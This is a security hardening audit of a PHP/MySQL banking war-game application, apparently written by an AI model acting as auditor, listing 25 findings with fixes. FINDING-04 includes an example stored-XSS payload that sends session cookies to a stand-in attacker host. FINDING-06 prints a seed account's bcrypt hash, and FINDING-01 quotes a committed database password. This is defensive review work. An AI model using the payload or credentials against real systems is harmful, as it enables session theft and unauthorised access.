# TransactiWar Security Hardening Audit

**Date:** 2026-03-17
**Auditor:** Security Engineer (Claude Opus 4.6)
**Scope:** Full codebase review of TransactiWar PHP/MySQL banking war-game application
**Objective:** Identify all vulnerabilities and weak security practices; recommend concrete fixes without introducing frameworks or breaking existing functionality.
**Commit:** `e5485a3` (main)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Methodology](#methodology)
3. [Security Strengths](#security-strengths)
4. [Vulnerability Findings](#vulnerability-findings)
5. [Prioritized Hardening Checklist](#prioritized-hardening-checklist)
6. [Appendix: Files Reviewed](#appendix-files-reviewed)

---

## Executive Summary

The TransactiWar application demonstrates a strong security baseline: prepared statements everywhere, HMAC-bound CSRF tokens with a bounded pool, session fingerprinting, bcrypt with SHA-384 pre-hashing, FOR UPDATE deadlock-safe transfer locks, GD image reprocessing, CSP nonces, and a read-only container filesystem. Many common web vulnerabilities (SQLi, basic XSS, session fixation) are already well-mitigated.

However, this audit identified **25 findings** across CRITICAL, HIGH, MEDIUM, and LOW severities. The most dangerous issues are: **committed production secrets in `.env`**, a **diagnostic endpoint exposed in the web root**, **username/email enumeration via registration**, and several **XSS vectors through `nl2br()` on already-escaped output** which can be weaponized in a war-game context.

---

## Methodology

- Manual line-by-line review of every PHP source file, SQL schema, Docker configuration, Apache vhost, .htaccess, shell script, and environment file
- Traced all user-input flows from `$_GET`/`$_POST`/`$_FILES` to database queries and HTML output
- Analyzed race conditions in concurrent payment flows
- Reviewed Docker security posture (read-only FS, privilege drop, resource limits, network isolation)
- Cross-referenced against OWASP Top 10 2025 and CWE/SANS Top 25

---

## Security Strengths

These are already implemented and working correctly:

| Area | Implementation |
|------|---------------|
| SQL Injection | Prepared statements with bound parameters in 100% of queries |
| CSRF | HMAC-bound tokens, bounded pool (5 slots), single-use rotation, origin/referer validation with Sec-Fetch-Site fallback |
| Session Management | Strict mode, httponly, secure, SameSite=Strict, 48-char SID, fingerprint (IP+UA HMAC), inactivity/absolute timeout, regen interval |
| Password Storage | bcrypt cost 10 with SHA-384 pre-hash (defeats 72-byte truncation), transparent legacy migration, dummy hash for enumeration defense |
| Transfer Integrity | DB transaction with ordered `FOR UPDATE` locks (deadlock-safe), DB-level `CHECK(balance_paise >= 0)`, self-transfer check, nonce + page-load-ID double-spend prevention |
| File Upload | MIME validation, dimension cap (1200x1200), GD reprocessing (strips polyglots), random filename, storage outside web root |
| Rate Limiting | DB-backed exponential backoff for login, registration, password change, search; timestamp-based (no `sleep()` blocking) |
| Headers | CSP with nonces, HSTS, X-Frame-Options DENY, nosniff, COEP/COOP/CORP, Permissions-Policy, ServerTokens Prod, expose_php Off |
| Docker | Read-only filesystem, tmpfs for scratch dirs, no-new-privileges, resource limits, unprivileged ports (www-data), backend network isolation |

---

## Vulnerability Findings

### FINDING-01: Production Secrets Committed in `docker/.env`

| Field | Detail |
|-------|--------|
| **Severity** | **CRITICAL** |
| **File** | `docker/.env:1-10` |
| **CWE** | CWE-798 (Use of Hard-coded Credentials) |

**Description:** The `docker/.env` file contains real database passwords and a production SESSION_SECRET and is tracked in git. Any attacker with repo access (or a `.git` exposure) has full database credentials and can forge session tokens.

**Attack Scenario:** Attacker clones the repo (public or leaked), reads `MYSQL_ROOT_PASSWORD=notrootpassword`, `SESSION_SECRET=a64c6739...`, and connects directly to the database or crafts session fingerprints.

**Fix:**
```bash
# 1. Add docker/.env to .gitignore immediately
echo "docker/.env" >> .gitignore

# 2. Remove from git tracking (preserves local file)
git rm --cached docker/.env

# 3. Rotate ALL secrets: generate new values
SESSION_SECRET=$(openssl rand -hex 32)
MYSQL_ROOT_PASSWORD=$(openssl rand -base64 24)
MYSQL_PASSWORD=$(openssl rand -base64 24)

# 4. Update docker/.env.example with placeholder values (already done)
# 5. Rotate the SESSION_SECRET in the running environment
```

---

### FINDING-02: Diagnostic Endpoint Accessible in Production

| Field | Detail |
|-------|--------|
| **Severity** | **CRITICAL** |
| **File** | `scripts/debug/diagnostic.php:1-52` |
| **CWE** | CWE-200 (Exposure of Sensitive Information) |

**Description:** While `diagnostic.php` is in `scripts/debug/` (not in `public/`), the H7 docker-compose fix mounts only `public/`, `includes/`, `config/`, and `storage/`. However, the old worktree configurations and the original docker-compose (before H7) mounted the entire repo. If any deployment reverts to the old mount pattern (`../:/var/www/html:ro`), this file becomes directly accessible and leaks all database table names. The `APP_DIAGNOSTIC_MODE` env var gate is good but defaults to `0` — if anyone sets it to `1` for debugging and forgets, it's a full information disclosure.

**Attack Scenario:** Attacker visits `https://target/scripts/debug/diagnostic.php` on a deployment using the old mount. Even with diagnostic mode off, the response confirms PHP is running, confirming the tech stack.

**Fix:**
```php
// Option A: Delete the file entirely — it serves no production purpose
// rm scripts/debug/diagnostic.php

// Option B: If kept for development, add an IP allowlist
$allowedIps = ['127.0.0.1', '::1'];
if (!in_array($_SERVER['REMOTE_ADDR'], $allowedIps, true)) {
    http_response_code(404);
    exit;
}
```

---

### FINDING-03: Registration Reveals Username/Email Existence

| Field | Detail |
|-------|--------|
| **Severity** | **HIGH** |
| **File** | `public/register.php:75-76`, `includes/auth.php:674-681` |
| **CWE** | CWE-203 (Observable Discrepancy / User Enumeration) |

**Description:** When `register_user()` catches SQLSTATE 23000 (duplicate key), it returns `'duplicate'`, and `register.php` displays "Username or email already exists." This confirms to an attacker that a specific username or email is registered.

**Attack Scenario:** Attacker iterates common usernames/emails via registration POST requests. Rate limiting (5 attempts/15min) slows but does not prevent enumeration — attacker rotates IPs or waits out lockouts.

**Fix:**
```php
// In register.php, show the same success message for both outcomes:
if ($result === true || $result === 'duplicate') {
    $flash_success = 'If this username and email are available, your account has been created. Check your email to verify.';
} else {
    $flash_error = 'Registration failed. Please try again.';
}
```

---

### FINDING-04: XSS via `nl2br()` on Pre-Escaped Bio Content

| Field | Detail |
|-------|--------|
| **Severity** | **HIGH** |
| **File** | `public/view_profile.php:38,66` |
| **CWE** | CWE-79 (Cross-site Scripting) |

**Description:** The bio is escaped via `escape_output()` in `profile_view_logic.php:83`, producing safe `&lt;` entities. Then `view_profile.php` passes this through `nl2br()`:
```php
<?= nl2br($profileData['bio']) ?>
```
`nl2br()` injects raw `<br />` tags into the already-escaped string. While the bio content itself is entity-encoded, this pattern is dangerous because `nl2br()` returns an HTML string that bypasses any further escaping. If there is ever a path where `$profileData['bio']` is not pre-escaped, this becomes a stored XSS vector. Additionally, `nl2br()` on an already-escaped string double-encodes newlines inconsistently.

**Attack Scenario:** If any code path populates `$profileData['bio']` without `escape_output()`, an attacker stores `<script>document.location='http://evil.com/?c='+document.cookie</script>` in their bio, and `nl2br()` passes it through raw.

**Fix:**
```php
// In view_profile.php, escape at the output point, not in the logic layer:
// In profile_view_logic.php, store the RAW bio:
'bio' => $user['bio'] ?? 'No operational biography provided.',

// In view_profile.php, escape AND nl2br at the template:
<?= nl2br(escape_output($profileData['bio'])) ?>
```

---

### FINDING-05: `balance_rupees` Output Without Contextual Escaping

| Field | Detail |
|-------|--------|
| **Severity** | **MEDIUM** |
| **File** | `includes/profile_view_logic.php:92` |
| **CWE** | CWE-79 (XSS) |

**Description:** `$profileData['balance_rupees']` is set via `number_format()` and output in `view_profile.php:48` wrapped in `escape_output()`:
```php
<?= escape_output($profileData['balance_rupees']) ?>
```
This is currently safe because `number_format()` only produces digits, commas, and dots. However, the `payment_page.php:84` equivalent is also safe. The defense-in-depth concern is that `number_format()` can return locale-dependent characters in some PHP configurations. `escape_output()` is correctly applied on line 48 of view_profile.php.

**Current Status:** Adequately mitigated by `escape_output()`. No immediate action needed. Listed for completeness.

---

### FINDING-06: Seed Accounts Use Real Team Member Names with Known Passwords

| Field | Detail |
|-------|--------|
| **Severity** | **HIGH** |
| **File** | `docker/setup.sh:150-157` |
| **CWE** | CWE-798 (Hard-coded Credentials) |

**Description:** Six seed accounts (`nishanth`, `tejas`, `divyansh`, `harshavardhan`, `vrishin`, `trudy`) are created with pre-computed bcrypt hashes. The passwords are unknown publicly but are static across all deployments. If any team member's password becomes known (e.g., team sharing), every deployment is compromised. The `trudy` account name (classic crypto adversary) signals an attacker account.

**Attack Scenario:** Attacker studies the public repo, identifies seed usernames, and attempts common passwords or dictionary attacks. The hash `$2y$10$3l/mqAXHfk6lahCx6Kwq5.lj/DD6mIrOQmVQOpy9RXS8ax90dEOzy` for `trudy` could be cracked offline.

**Fix:**
```bash
# Option A: Generate random passwords at seed time
SEED_PASS=$(openssl rand -base64 16)
SEED_HASH=$(php -r "echo password_hash(base64_encode(hash('sha384', '$SEED_PASS', true)), PASSWORD_BCRYPT, ['cost' => 10]);")

# Option B: Use generic usernames
# ('testuser_1', 'testuser_2', ...) instead of real names

# Option C: Force password change on first login for seeded accounts
# Add a `must_change_password` column, check in require_login()
```

---

### FINDING-07: `docker/.env` File Committed to Git (Sensitive Data Exposure)

| Field | Detail |
|-------|--------|
| **Severity** | **CRITICAL** |
| **File** | `docker/.env` (tracked in git) |
| **CWE** | CWE-312 (Cleartext Storage of Sensitive Information) |

**Description:** This is related to FINDING-01 but emphasizes that the file is actively tracked in version control. The `.gitignore` file does not exclude `docker/.env`. The git history will retain these secrets even after removal.

**Fix:**
```bash
# Add to .gitignore
echo "docker/.env" >> .gitignore
git rm --cached docker/.env
git commit -m "chore: stop tracking docker/.env with production secrets"

# To scrub from history (if repo is public):
git filter-branch --force --index-filter \
  'git rm --cached --ignore-unmatch docker/.env' HEAD
# Or use BFG Repo-Cleaner
```

---

### FINDING-08: Content-Disposition Header Injection in `serve_image.php`

| Field | Detail |
|-------|--------|
| **Severity** | **MEDIUM** |
| **File** | `public/serve_image.php:73` |
| **CWE** | CWE-113 (HTTP Response Splitting) |

**Description:** The filename is placed directly into the `Content-Disposition` header:
```php
header('Content-Disposition: inline; filename="' . $filename . '"');
```
While the regex on line 20 restricts to `[a-zA-Z0-9._\-]+`, a filename containing a `"` would break the header. The regex currently blocks `"`, so this is safe. However, as defense-in-depth, the filename should be explicitly sanitized for header context.

**Fix:**
```php
// Replace line 73:
$safeFilename = str_replace(['"', "\r", "\n", "\0"], '', $filename);
header('Content-Disposition: inline; filename="' . $safeFilename . '"');
```

---

### FINDING-09: Missing `transfer_complete` Race Condition Window

| Field | Detail |
|-------|--------|
| **Severity** | **MEDIUM** |
| **File** | `public/payment_page.php:18-24`, `includes/process_payment.php:17-25` |
| **CWE** | CWE-362 (Race Condition) |

**Description:** The `transfer_complete` flag and nonce consumption provide good double-spend protection. However, there is a narrow window: if an attacker sends two identical POST requests simultaneously (before either processes line 25 `unset($_SESSION[$nonceKey])`), both requests could pass the nonce check because PHP sessions use file-based locking that serializes requests for the same session. **This is actually safe** because PHP's default session handler acquires an exclusive lock on `session_start()`, serializing concurrent requests for the same session ID.

**Current Status:** Safe due to PHP session locking. However, if the application migrates to a non-locking session handler (Redis, Memcached without locking), this would become exploitable.

**Fix (defense-in-depth for future session handler changes):**
```php
// Add a database-level idempotency key to process_payment.php:
// Before the transaction block:
$idempotencyKey = hash_hmac('sha256', $nonce . $target_uuid, $_SESSION['csrf_secret'] ?? '');

$stmt = $pdo->prepare("SELECT 1 FROM transactions WHERE idempotency_key = ? LIMIT 1");
$stmt->execute([$idempotencyKey]);
if ($stmt->fetch()) {
    $_SESSION['transfer_error'] = "This transfer has already been processed.";
    header("Location: /transaction_result.php");
    exit;
}
// Add idempotency_key column to transactions table with UNIQUE constraint
```

---

### FINDING-10: Logout SameSite Cookie Inconsistency

| Field | Detail |
|-------|--------|
| **Severity** | **LOW** |
| **File** | `includes/auth.php:992` |
| **CWE** | CWE-614 (Sensitive Cookie Without Secure Flag) |

**Description:** In `logout_user()`, the cookie deletion sets `'samesite' => 'Lax'` (line 992), while the rest of the application uses `'samesite' => 'Strict'` (session.php:10, session.php:24). This inconsistency means the deletion cookie has a different SameSite attribute than the original session cookie.

**Fix:**
```php
// In auth.php:logout_user(), line 992, change:
'samesite' => 'Lax',
// To:
'samesite' => $params['samesite'] ?? 'Strict',
```

---

### FINDING-11: `payment_page.php` Title XSS via Username (Defense-in-Depth)

| Field | Detail |
|-------|--------|
| **Severity** | **LOW** |
| **File** | `public/payment_page.php:92` |
| **CWE** | CWE-79 (XSS) |

**Description:**
```php
<?php render_page_head('Transactiwar | Pay ' . $receiverUsername); ?>
```
`$receiverUsername` comes from the database and is concatenated into `render_page_head()` which passes it through `htmlspecialchars()` in `header.php:212`. This is safe. However, the value flows through string concatenation before escaping, which is a fragile pattern.

**Fix (defense-in-depth):**
```php
// Escape before concatenation:
<?php render_page_head('Transactiwar | Pay ' . escape_output($receiverUsername)); ?>
// Note: render_page_head already escapes, so this double-escapes.
// Better: pass components separately:
// render_page_head('Transactiwar | Pay', $receiverUsername);
```

---

### FINDING-12: Missing `Secure` Flag on Session Cookie in Non-HTTPS Development

| Field | Detail |
|-------|--------|
| **Severity** | **MEDIUM** |
| **File** | `config/session.php:16-22` |
| **CWE** | CWE-614 |

**Description:** The `secure` flag is set dynamically based on `is_secure_request()`. In development without TLS, the session cookie transmits over plaintext HTTP. While `ENFORCE_HTTPS=1` is the default, if a developer sets `ENFORCE_HTTPS=0`, the cookie is not marked secure and can be intercepted on the network.

**Fix:**
```php
// In config/session.php, always set secure=true when ENFORCE_HTTPS=1:
$secure = is_secure_request() || should_enforce_https();
```

---

### FINDING-13: `error_log()` Leaks Class Names and Error Codes

| Field | Detail |
|-------|--------|
| **Severity** | **LOW** |
| **File** | Multiple: `auth.php:620,697,797,900`, `profile_update_logic.php:216`, `register.php:81` |
| **CWE** | CWE-209 (Information Exposure Through Error Message) |

**Description:** Error logging calls like `error_log('Password change failed: ' . get_class($e) . ' code=' . $e->getCode())` write class names and error codes to the PHP error log. If `display_errors` is accidentally enabled (overriding the Docker php.ini), these details would leak to the browser. Currently `display_errors = Off` in the Docker php.ini, so this is contained.

**Current Status:** Mitigated by `display_errors = Off`. Low risk.

---

### FINDING-14: No Rate Limiting on Transaction Endpoint

| Field | Detail |
|-------|--------|
| **Severity** | **MEDIUM** |
| **File** | `includes/process_payment.php` (entire file) |
| **CWE** | CWE-770 (Allocation of Resources Without Limits) |

**Description:** Login, registration, search, and password changes all have rate limiting. However, the transfer endpoint has no rate limit. An authenticated user can spam transfers rapidly, creating: (1) excessive database load from `FOR UPDATE` locks, (2) potential denial-of-service against specific receiver accounts, (3) rapid balance drain that may be harder to detect/reverse.

**Attack Scenario:** Compromised account sends thousands of 1-rupee transfers in a loop, creating a flood of locked rows and transaction records.

**Fix:**
```php
// Add to process_payment.php, after require_login():
$transferKey = 'txn:' . $_SESSION['user_id'];
// Reuse the login_attempts infrastructure:
$now = time();
$stmt = $pdo->prepare("SELECT attempts, last_attempt FROM login_attempts WHERE ip = ? LIMIT 1");
$stmt->execute([$transferKey]);
$txRow = $stmt->fetch(PDO::FETCH_ASSOC);
$txAttempts = $txRow ? (int)$txRow['attempts'] : 0;
$txLast = $txRow ? (int)$txRow['last_attempt'] : 0;

// Allow max 20 transfers per 60 seconds
if ($txAttempts >= 20 && ($now - $txLast) < 60) {
    $_SESSION['transfer_error'] = "Too many transfers. Please wait.";
    header("Location: /transaction_result.php");
    exit;
}
// Record attempt (INSERT ... ON DUPLICATE KEY UPDATE)
```

---

### FINDING-15: Searchbox Uses `GET` Without CSRF — Information Leak via Referer

| Field | Detail |
|-------|--------|
| **Severity** | **LOW** |
| **File** | `public/searchbox.php:32` |
| **CWE** | CWE-598 (Use of GET Request Method With Sensitive Query Strings) |

**Description:** The search form uses `method="GET"`, placing the search term in the URL query string. This means: (1) search terms appear in browser history, (2) search terms leak via the `Referer` header when navigating to external links (mitigated by `Referrer-Policy: strict-origin-when-cross-origin`), and (3) search queries appear in server access logs.

**Fix:**
```html
<!-- Change to POST for privacy-sensitive search -->
<form method="POST" action="/searchbox.php" class="d-flex gap-2 mb-2">
    <?= csrfField() ?>
    <!-- ... -->
</form>
<!-- Then in PHP, read from post_str('q') instead of get_str('q') -->
```

---

### FINDING-16: Missing `X-Robots-Tag` Header for Private Pages

| Field | Detail |
|-------|--------|
| **Severity** | **LOW** |
| **File** | `includes/header.php` (send_security_headers function) |
| **CWE** | CWE-200 |

**Description:** No `X-Robots-Tag: noindex` header is sent. Search engine crawlers that somehow reach the application (e.g., via leaked URL) could index login pages, profile pages, and search results.

**Fix:**
```php
// Add to send_security_headers() in header.php:
header('X-Robots-Tag: noindex, nofollow, noarchive');
```

---

### FINDING-17: `APP_DIAGNOSTIC_MODE` Environment Variable Exposed to App Container

| Field | Detail |
|-------|--------|
| **Severity** | **MEDIUM** |
| **File** | `docker/docker-compose.yml:101` |
| **CWE** | CWE-489 (Active Debug Code) |

**Description:** `APP_DIAGNOSTIC_MODE` is passed to the app container. While `diagnostic.php` is in `scripts/debug/` (not mounted under the H7 fix), the env var is available to any PHP code via `getenv('APP_DIAGNOSTIC_MODE')`. If any code checks this variable to enable debug features, it creates an attack surface.

**Fix:**
```yaml
# Remove from docker-compose.yml app service environment:
# APP_DIAGNOSTIC_MODE: ${APP_DIAGNOSTIC_MODE:-0}  # DELETE THIS LINE
```

---

### FINDING-18: Session Not Invalidated on User Deletion

| Field | Detail |
|-------|--------|
| **Severity** | **MEDIUM** |
| **File** | `includes/auth.php` (require_login function) |
| **CWE** | CWE-613 (Insufficient Session Expiration) |

**Description:** If an admin or attacker deletes a user from the database, `require_login()` checks `session_version` via a `SELECT` query (line 878-885). If the user row is deleted, `$row` is `false`, which triggers a redirect to login. This is good. However, there is no admin interface or user-deletion feature currently, so this is informational.

**Current Status:** Correctly handled by the `!$row` check on line 890. Informational only.

---

### FINDING-19: `profile_update_logic.php` Bio Length Mismatch

| Field | Detail |
|-------|--------|
| **Severity** | **LOW** |
| **File** | `includes/profile_update_logic.php:53`, `includes/sanitize.php:22` |
| **CWE** | CWE-20 (Improper Input Validation) |

**Description:** `profile_update_logic.php` rejects bios over 3000 characters (line 53), but `MAX_BIO_LEN` in `sanitize.php` is 65535 (the TEXT column limit). `sanitize_bio()` truncates at 65535. The 3000-char limit in the update logic is a stricter business rule but is inconsistent with the constant. An attacker can submit up to 3000 chars of valid bio, which is fine, but the dual limits are confusing for maintenance.

**Fix:**
```php
// Define a consistent application-level limit:
define('APP_MAX_BIO_LEN', 3000);

// Use in profile_update_logic.php:
if (mb_strlen($raw_input_bio, 'UTF-8') > APP_MAX_BIO_LEN) {

// And in sanitize_bio():
$bio = mb_substr($bio ?? '', 0, APP_MAX_BIO_LEN, 'UTF-8');
```

---

### FINDING-20: Seed Accounts Always Re-Seeded on Container Restart

| Field | Detail |
|-------|--------|
| **Severity** | **MEDIUM** |
| **File** | `docker/setup.sh:148-163` |
| **CWE** | CWE-798 |

**Description:** The setup container runs `ON DUPLICATE KEY UPDATE` which resets `email`, `password_hash`, and `bio` for seeded accounts on every restart. If a defender changes a seed account's password during the war game, the next container restart reverts it to the original hash. This gives attackers a persistent backdoor.

**Attack Scenario:** During a war-game, defenders change `trudy`'s password. Attacker triggers a container restart (or waits for one). Password reverts to the known hash.

**Fix:**
```sql
-- In setup.sh, only INSERT, never UPDATE existing rows:
INSERT IGNORE INTO users (username, email, password_hash, balance_paise, bio)
VALUES (...);
-- Or remove the ON DUPLICATE KEY UPDATE clause
-- Or add a sentinel: only seed if a marker row is absent
```

---

### FINDING-21: `certs` Volume Mount is Writable

| Field | Detail |
|-------|--------|
| **Severity** | **MEDIUM** |
| **File** | `docker/docker-compose.yml:125` |
| **CWE** | CWE-732 (Incorrect Permission Assignment) |

**Description:** The TLS certs mount `./certs:/etc/apache2/ssl` is writable (no `:ro`). The comment on line 123-124 acknowledges this is for self-signed cert generation. However, after the entrypoint generates certs, an attacker with RCE could replace the TLS certificate with their own, enabling a MitM attack on future connections.

**Fix:**
```yaml
# For war-game/production: pre-generate certs and mount read-only:
- ./certs:/etc/apache2/ssl:ro
# Or: generate certs in entrypoint, then remount read-only
# (not possible with docker-compose, so pre-generate)
```

---

### FINDING-22: Missing Database Index on `login_attempts.last_attempt`

| Field | Detail |
|-------|--------|
| **Severity** | **LOW** |
| **File** | `database/init.sql:79-86` |
| **CWE** | CWE-400 (Uncontrolled Resource Consumption) |

**Description:** The `login_attempts` table has only a PRIMARY KEY on `ip`. Queries that check `last_attempt` in the `WHERE` clause or `IF()` conditions are evaluated via full table scan on each login. Under heavy brute-force load, this table could grow large.

**Fix:**
```sql
-- Add cleanup job or TTL-based expiry:
-- Option A: Index (not needed with small table)
-- Option B: Periodic cleanup in setup or cron
DELETE FROM login_attempts WHERE last_attempt < UNIX_TIMESTAMP() - 86400;
```

---

### FINDING-23: `header.html` Not Gated by Authentication

| Field | Detail |
|-------|--------|
| **Severity** | **LOW** |
| **File** | `public/header.html` |
| **CWE** | CWE-200 |

**Description:** `header.html` is a static file in the public web root. It is included via `include __DIR__ . '/header.html'` in authenticated pages, but it's also directly accessible at `https://target/header.html`. It reveals the application's navigation structure (Search Users, Transaction History, Logout links).

**Fix:**
```php
// Rename to header.inc.php and add a guard:
<?php if (!defined('APP_LOADED')) { http_response_code(404); exit; } ?>
// Or move outside public/ to includes/partials/header.html
```

---

### FINDING-24: `footer.php` Accessible Directly Without Authentication

| Field | Detail |
|-------|--------|
| **Severity** | **LOW** |
| **File** | `public/footer.php` |
| **CWE** | CWE-200 |

**Description:** `footer.php` is directly accessible and calls `get_csp_nonce()`, which requires `header.php` to be loaded. Direct access causes a PHP fatal error, potentially leaking error details if `display_errors` is ever enabled.

**Fix:**
```php
// Add to the top of footer.php:
if (!function_exists('get_csp_nonce')) {
    http_response_code(404);
    exit;
}
```

---

### FINDING-25: Apache `AllowOverride` Permits `.htaccess` Manipulation

| Field | Detail |
|-------|--------|
| **Severity** | **MEDIUM** |
| **File** | `docker/apache/default-ssl.conf:22` |
| **CWE** | CWE-16 (Configuration) |

**Description:** The M3 fix restricted `AllowOverride` to `FileInfo AuthConfig Options=ExecCGI,Indexes`, which is good. However, `FileInfo` still allows `.htaccess` to set `AddType`, `AddHandler`, and `RewriteRule` directives. With the read-only filesystem (M10 fix), an attacker cannot create `.htaccess` files, so this is mitigated. If the read-only constraint is ever relaxed, an attacker could add handlers.

**Current Status:** Mitigated by read-only filesystem. Defense-in-depth recommendation.

**Fix:**
```apache
# If the read-only FS guarantee holds, this is fine.
# For maximum hardening, restrict further:
AllowOverride AuthConfig Options=Indexes
# And move existing .htaccess FileInfo directives into the vhost config.
```

---

## Prioritized Hardening Checklist

### CRITICAL (Fix Before War-Game)

| # | Finding | Action |
|---|---------|--------|
| 1 | **FINDING-01/07: Production secrets in git** | Add `docker/.env` to `.gitignore`, rotate ALL secrets (DB passwords, SESSION_SECRET) |
| 2 | **FINDING-02: Diagnostic endpoint** | Delete `scripts/debug/diagnostic.php` or ensure it's never mounted in any deployment |
| 3 | **FINDING-06/20: Seed account backdoor** | Change `ON DUPLICATE KEY UPDATE` to `INSERT IGNORE`; use random passwords for seeds; remove real team names |

### HIGH (Fix Within 24 Hours)

| # | Finding | Action |
|---|---------|--------|
| 4 | **FINDING-03: User enumeration via registration** | Return identical success messages for both new and duplicate registrations |
| 5 | **FINDING-04: `nl2br()` XSS pattern** | Move escaping to template layer: `<?= nl2br(escape_output($bio)) ?>` instead of pre-escaping in logic |

### MEDIUM (Fix Before Production)

| # | Finding | Action |
|---|---------|--------|
| 6 | **FINDING-08: Content-Disposition header** | Sanitize filename in header context |
| 7 | **FINDING-09: Transfer idempotency** | Add DB-level idempotency key for future session handler changes |
| 8 | **FINDING-12: Secure cookie flag** | Set `$secure = is_secure_request() \|\| should_enforce_https()` |
| 9 | **FINDING-14: No transfer rate limit** | Add rate limiting to `process_payment.php` |
| 10 | **FINDING-17: Diagnostic env var in container** | Remove `APP_DIAGNOSTIC_MODE` from app container environment |
| 11 | **FINDING-21: Writable certs volume** | Pre-generate certs and mount `:ro` |
| 12 | **FINDING-25: AllowOverride FileInfo** | Restrict to `AuthConfig Options=Indexes` and move rules to vhost |

### LOW (Improve Over Time)

| # | Finding | Action |
|---|---------|--------|
| 13 | **FINDING-10: Logout SameSite inconsistency** | Use `$params['samesite'] ?? 'Strict'` |
| 14 | **FINDING-11: Payment title escaping** | Pre-escape receiver username before concatenation |
| 15 | **FINDING-13: Error log class name leaks** | Ensure `display_errors = Off` is verified; consider removing class names from logs |
| 16 | **FINDING-15: GET-based search** | Switch search form to POST |
| 17 | **FINDING-16: Missing X-Robots-Tag** | Add `X-Robots-Tag: noindex` to security headers |
| 18 | **FINDING-19: Bio length mismatch** | Define `APP_MAX_BIO_LEN` constant used consistently |
| 19 | **FINDING-22: login_attempts cleanup** | Add periodic cleanup of expired entries |
| 20 | **FINDING-23: header.html exposure** | Move outside public/ or rename with PHP guard |
| 21 | **FINDING-24: footer.php direct access** | Add function_exists guard |

---

## Appendix: Files Reviewed

### PHP Source Files
- `config/db.php` - Database connection bootstrap
- `config/session.php` - Session configuration and fingerprinting
- `includes/auth.php` - Authentication, login, registration, rate limiting
- `includes/csrf.php` - CSRF token generation and validation
- `includes/sanitize.php` - Input validation and output encoding
- `includes/logger.php` - Activity and security event logging
- `includes/header.php` - Security headers and CSP
- `includes/process_payment.php` - Money transfer logic
- `includes/profile_update_logic.php` - Profile edit handler
- `includes/profile_view_logic.php` - Profile view handler
- `includes/change_password_logic.php` - Password change handler
- `includes/request.php` - HTTP request utilities (IP, scheme, HTTPS enforcement)
- `public/index.php` - Entry point / router
- `public/login.php` - Login form and handler
- `public/register.php` - Registration form and handler
- `public/profile.php` - Profile edit page
- `public/view_profile.php` - Profile view page
- `public/payment_page.php` - Transfer form and POST handler
- `public/searchbox.php` - User search
- `public/serve_image.php` - Secure image serving
- `public/transaction_history.php` - Transaction ledger
- `public/transaction_result.php` - Transfer result display
- `public/change_password.php` - Password change page
- `public/confirm_logout.php` - Logout confirmation
- `public/logout.php` - Logout handler
- `public/footer.php` - Page footer
- `public/header.html` - Navigation bar
- `scripts/debug/diagnostic.php` - Diagnostic endpoint

### Configuration & Infrastructure
- `docker/Dockerfile` - PHP 8.2 Apache image build
- `docker/docker-compose.yml` - Multi-service orchestration
- `docker/.env` / `docker/.env.example` - Environment variables
- `docker/setup.sh` - Database seeding script
- `docker/apache/000-default.conf` - HTTP→HTTPS redirect vhost
- `docker/apache/default-ssl.conf` - HTTPS vhost with TLS config
- `docker/apache/entrypoint.sh` - TLS cert generation + privilege drop
- `database/init.sql` - Schema definition
- `includes/.htaccess` - Deny all for includes directory
- `public/.htaccess` - Security headers + file blocking
- `public/uploads/.htaccess` - Deny all (vestigial directory)
- `public/assets/.htaccess` - Block PHP execution in assets
- `storage/uploads/.htaccess` - Deny all direct access

---

*End of Security Hardening Audit*
